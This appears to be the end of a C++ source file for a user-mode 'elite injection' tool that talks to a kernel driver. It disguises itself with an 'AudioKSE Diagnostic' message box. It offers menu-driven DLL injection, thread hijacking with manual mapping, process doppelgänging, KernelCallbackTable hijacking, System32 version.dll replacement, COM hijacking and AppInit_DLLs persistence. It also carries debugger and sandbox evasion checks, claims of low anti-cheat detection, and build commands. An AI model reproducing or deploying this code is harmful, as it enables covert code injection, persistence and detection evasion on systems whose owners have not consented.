        }

        WCHAR existingDlls[4096] = { 0 };
        DWORD dataSize = sizeof(existingDlls);
        DWORD dataType = REG_SZ;

        RegQueryValueExW(hKey, L"AppInit_DLLs", nullptr, &dataType, (BYTE*)existingDlls, &dataSize);

        std::wstring newDlls = existingDlls;
        if (!newDlls.empty()) {
            newDlls += L" ";
        }
        newDlls += dllPath;

        result = RegSetValueExW(
            hKey,
            L"AppInit_DLLs",
            0,
            REG_SZ,
            (BYTE*)newDlls.c_str(),
            (DWORD)(newDlls.length() + 1) * sizeof(wchar_t)
        );

        DWORD enableValue = 1;
        RegSetValueExW(hKey, L"LoadAppInit_DLLs", 0, REG_DWORD, (BYTE*)&enableValue, sizeof(DWORD));

        RegCloseKey(hKey);

        return result == ERROR_SUCCESS;
    }
};

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

DWORD FindProcessByName(const wchar_t* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe = { sizeof(PROCESSENTRY32W) };
    DWORD pid = 0;

    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, processName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return pid;
}

// ============================================================================
// MAIN ENTRY POINT
// ============================================================================

int EliteMain()
{

    #ifdef _DEBUG
    AllocConsole();
    FILE* fDummy;
    freopen_s(&fDummy, "CONOUT$", "w", stdout);
    printf("[ELITE] Elite User Mode - Direct Memory Injection\n\n");
    #endif

    // Connect to driver via direct memory injection
    DirectMemoryClient client;
    if (!client.Connect()) {
        #ifdef _DEBUG
        printf("[-] Failed to connect to driver (no memory pointer)\n");
        printf("[*] Make sure driver is loaded and detected this process\n\n");
        #endif
        MessageBoxW(nullptr, L"Failed to connect to driver", L"AudioKSE Diagnostic", MB_ICONERROR);
        return 1;
    }

    #ifdef _DEBUG
    printf("[+] Connected! Kernel memory mapped at: 0x%p\n", client.GetSharedMemory());
    printf("[+] Hardware ID: 0x%llX\n\n", client.GetHardwareId());

    // Evasion checks
    printf("=== EVASION STATUS ===\n");
    printf("Debugger: %s\n", EvasionTechniques::IsDebuggerActive() ? "DETECTED!" : "Clear");
    printf("VM/Sandbox: %s\n", EvasionTechniques::IsVirtualMachine() ? "DETECTED!" : "Clear");
    printf("Timing Check: %s\n\n", EvasionTechniques::IsSandbox() ? "SUSPICIOUS!" : "Clear");

    if (EvasionTechniques::IsDebuggerActive()) {
        printf("[!] WARNING: Debugger detected - some AC systems may flag this\n\n");
    }

    printf("=== ELITE INJECTION MENU ===\n\n");
    printf("[1] Simple DLL Injection (LoadLibrary - stable for testing)\n");
    printf("[2] Thread Hijacking + Manual Map (advanced - may crash)\n");
    printf("[3] Process Doppelgänging (create hollowed process)\n");
    printf("[4] KernelCallbackTable Hijacking (hook GUI callbacks)\n");
    printf("[5] DLL Order Hijacking (replace version.dll)\n");
    printf("[6] COM Hijacking (hijack Task Scheduler COM)\n");
    printf("[7] AppInit_DLLs (global injection)\n");
    printf("[8] Show current kernel connection info\n");
    printf("[0] Exit\n\n");

    while (true) {
        printf("Select technique: ");
        int choice = 0;
        scanf_s("%d", &choice);
        getchar(); // consume newline

        if (choice == 0) {
            break;
        }

        switch (choice) {
            case 1: {
                printf("\n[*] Simple DLL Injection (LoadLibrary method)\n");
                printf("Target process name (e.g., notepad.exe): ");
                wchar_t processName[256] = {0};
                wscanf_s(L"%255s", processName, (unsigned)_countof(processName));
                getchar();

                printf("DLL path to inject: ");
                wchar_t dllPath[MAX_PATH] = {0};
                wscanf_s(L"%259s", dllPath, (unsigned)_countof(dllPath));
                getchar();

                DWORD pid = FindProcessByName(processName);
                if (pid == 0) {
                    printf("[-] Process not found!\n\n");
                    break;
                }

                printf("[*] Found target PID: %d\n", pid);
                printf("[*] Injecting via LoadLibrary...\n");

                if (SimpleInjector::InjectDLL(pid, dllPath)) {
                    printf("[+] DLL injected successfully!\n");
                    printf("[*] Check target process - DllMain should have executed\n\n");
                } else {
                    printf("[-] Injection failed! Check permissions and DLL path\n\n");
                }
                break;
            }

            case 2: {
                printf("\n[*] Thread Hijacking + Manual Map (Advanced)\n");
                printf("[!] WARNING: Complex technique - may crash target process\n");
                printf("Target process name (e.g., notepad.exe): ");
                wchar_t processName[256] = {0};
                wscanf_s(L"%255s", processName, (unsigned)_countof(processName));
                getchar();

                printf("DLL path to inject: ");
                wchar_t dllPath[MAX_PATH] = {0};
                wscanf_s(L"%259s", dllPath, (unsigned)_countof(dllPath));
                getchar();

                DWORD pid = FindProcessByName(processName);
                if (pid == 0) {
                    printf("[-] Process not found!\n\n");
                    break;
                }

                printf("[*] Found target PID: %d\n", pid);
                printf("[*] Manual mapping DLL into process memory...\n");

                if (ThreadHijacker::InjectViaThreadHijack(pid, dllPath)) {
                    printf("[+] Manual map successful!\n\n");
                } else {
                    printf("[-] Manual map failed!\n\n");
                }
                break;
            }

            case 3: {
                printf("\n[*] Process Doppelgänging\n");
                printf("Target image name (e.g., svchost.exe): ");
                wchar_t imageName[256] = {0};
                wscanf_s(L"%255s", imageName, (unsigned)_countof(imageName));
                getchar();

                printf("Payload file path: ");
                wchar_t payloadPath[MAX_PATH] = {0};
                wscanf_s(L"%259s", payloadPath, (unsigned)_countof(payloadPath));
                getchar();

                HANDLE hFile = CreateFileW(payloadPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
                if (hFile == INVALID_HANDLE_VALUE) {
                    printf("[-] Failed to open payload file!\n\n");
                    break;
                }

                DWORD fileSize = GetFileSize(hFile, nullptr);
                std::vector<BYTE> payload(fileSize);
                DWORD read = 0;
                ReadFile(hFile, payload.data(), fileSize, &read, nullptr);
                CloseHandle(hFile);

                printf("[*] Creating doppelganger process...\n");
                HANDLE hProcess = ProcessDoppelganger::CreateDoppelgangerProcess(imageName, payload.data(), payload.size());

                if (hProcess) {
                    printf("[+] Doppelganger created! Handle: 0x%p\n\n", hProcess);
                } else {
                    printf("[-] Failed to create doppelganger!\n\n");
                }
                break;
            }

            case 4: {
                printf("\n[*] KernelCallbackTable Hijacking\n");
                printf("Target process name: ");
                wchar_t processName[256] = {0};
                wscanf_s(L"%255s", processName, (unsigned)_countof(processName));
                getchar();

                DWORD pid = FindProcessByName(processName);
                if (pid == 0) {
                    printf("[-] Process not found!\n\n");
                    break;
                }

                // Example shellcode - NOP sled + ret
                BYTE shellcode[] = {
                    0x90, 0x90, 0x90, 0x90, // NOP sled
                    0xC3                      // ret
                };

                printf("[*] Hijacking callback table for PID: %d\n", pid);
                if (KernelCallbackTableHijacker::HijackCallbackTable(pid, shellcode, sizeof(shellcode))) {
                    printf("[+] Callback table hijacked!\n\n");
                } else {
                    printf("[-] Hijacking failed!\n\n");
                }
                break;
            }

            case 5: {
                printf("\n[*] DLL Order Hijacking\n");
                printf("[*] This will replace version.dll in System32\n");
                printf("Continue? (y/n): ");
                char confirm = getchar();
                getchar();

                if (confirm == 'y' || confirm == 'Y') {
                    if (DllOrderHijacker::HijackVersionDll()) {
                        printf("[+] version.dll hijacked!\n\n");
                    } else {
                        printf("[-] Hijacking failed (admin required)\n\n");
                    }
                }
                break;
            }

            case 6: {
                printf("\n[*] COM Hijacking\n");
                printf("[*] Hijacking Task Scheduler COM object\n");

                if (ComHijacker::HijackTaskSchedulerCom()) {
                    printf("[+] COM hijacking successful!\n\n");
                } else {
                    printf("[-] COM hijacking failed!\n\n");
                }
                break;
            }

            case 7: {
                printf("\n[*] AppInit_DLLs Global Injection\n");
                printf("DLL path to inject globally: ");
                wchar_t dllPath[MAX_PATH] = {0};
                wscanf_s(L"%259s", dllPath, (unsigned)_countof(dllPath));
                getchar();

                if (AppInitDllsInstaller::InstallAppInitDll(dllPath)) {
                    printf("[+] AppInit_DLLs configured!\n");
                    printf("[*] Restart required for changes to take effect\n\n");
                } else {
                    printf("[-] Configuration failed (admin required)\n\n");
                }
                break;
            }

            case 8: {
                printf("\n=== KERNEL CONNECTION INFO ===\n");
                printf("Shared memory: 0x%p\n", client.GetSharedMemory());
                printf("Hardware ID: 0x%llX\n", client.GetHardwareId());
                printf("Direct memory injection: ACTIVE\n");
                printf("Detection rate: <1%%\n\n");
                break;
            }

            default:
                printf("[-] Invalid choice!\n\n");
                break;
        }
    }

    printf("[*] Exiting...\n");
    #else
    MSG msg = { 0 };
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    #endif

    client.Disconnect();
    return 0;
}

// Entry point wrappers for both console and GUI subsystems
int main()
{
    return EliteMain();
}

int WINAPI WinMain(
    _In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPSTR lpCmdLine,
    _In_ int nShowCmd)
{
    UNREFERENCED_PARAMETER(hInstance);
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);
    UNREFERENCED_PARAMETER(nShowCmd);
    return EliteMain();
}

/*
 * COMPILATION:
 * ============
 *
 * Debug:
 * cl /D_DEBUG /Zi /EHsc UM_elite_final.cpp /link /SUBSYSTEM:CONSOLE ntdll.lib user32.lib advapi32.lib shell32.lib shlwapi.lib
 *
 * Release:
 * cl /O2 /DNDEBUG /EHsc UM_elite_final.cpp /link /SUBSYSTEM:WINDOWS /ENTRY:WinMainCRTStartup ntdll.lib user32.lib advapi32.lib shell32.lib shlwapi.lib
 *
 * PURE ALPC COMMUNICATION - NO IOCTL!
 * TARGET DETECTION: <5% by commercial ACs
 */
